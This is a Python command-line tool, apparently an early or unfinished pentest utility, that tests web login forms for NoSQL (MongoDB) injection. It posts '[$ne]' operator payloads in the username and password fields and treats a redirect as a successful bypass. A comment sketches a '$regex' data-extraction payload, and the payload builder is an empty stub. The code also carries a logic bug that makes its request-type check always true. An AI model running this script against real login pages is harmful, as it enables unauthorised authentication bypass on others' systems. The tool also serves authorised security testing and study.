#!/usr/bin/env python3


import string
import click
from sys import stdout, stderr, argv
from requests import post, get, put
from urllib3.exceptions import InsecureRequestWarning

class bc:
    PURPHEAD = '\033[35m'
    OKBLUE = '\033[34m'
    OKGREEN = '\033[32m'
    WARNING = '\033[33m'
    CYAN = '\033[36m'
    FAIL = '\033[31m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DEFAULT = '\033[0m'

def test_injection(h, r, up, pp, ij, ot):
    print(h,r,up,pp,ij,ot)
    payld = {up + '[$ne]' : 'a', pp + '[$ne]' : '1' + ',' + ot}
    if r is 'post' or 'POST':
        query = post(h, data=payld, allow_redirects=False, verify=False)
        if query.status_code == 302:
            stdout.write(bc.OKGREEN + f'[+] {h} is injectable with "{up}" and "{pp}" parameters'+'\n'+bc.DEFAULT)
            return True
        else:
            stdout.write(bc.FAIL + f'[-] {h} is not injectable through "{up}" and "{pp}" parameters'+'\n'+bc.DEFAULT)
            return False

# para = {para1 + '[$regex]' : "^" + firstChar + ".*", para2 + '[$ne]' : '1' + otherpara}
def build_payload(h, up, pp, ij, ot):
    pass

def show_banner():
    stdout.write(r'''
                      |
  __ \    __|   _` |  |   _ \
  |   | \__ \  (   |  |   __/
 _|  _| ____/ \__, | _| \___|
                  _|
by disastrpc | github.com/disastrpc
Injection tool for NoSQL database engines like MongoDB'''+'\n\n')

show_banner()
@click.command()
@click.option('-r','--request',type=click.Choice(['POST','GET']),default='POST',
                    help='Choose request type',show_default=True)
@click.option('-U','userp',default='username',
                    help='Name of the username parameter',show_default=True,metavar='<str>')
@click.option('-P','passwdp',default='password',
                    help='Name of the password parameter',show_default=True,metavar='<str>')
@click.option('-p','--other-params','otherparam',default=[],
                    help='List of other parameters contained in the URL. Ex: login:login',metavar='<key:val>')
@click.option('-i','--inject-points','injects',default=['username','password'],show_default=True,
                    help='Specify list of parameters for test for injections',metavar='<v1,v2,v3>')
@click.argument('host')
def main(
    request='',
    userp='',
    passwdp='',
    otherparam=[],
    injects=[],
    host=''):
    if test_injection(host, request, userp, passwdp, injects, otherparam):
        print("true")

main()
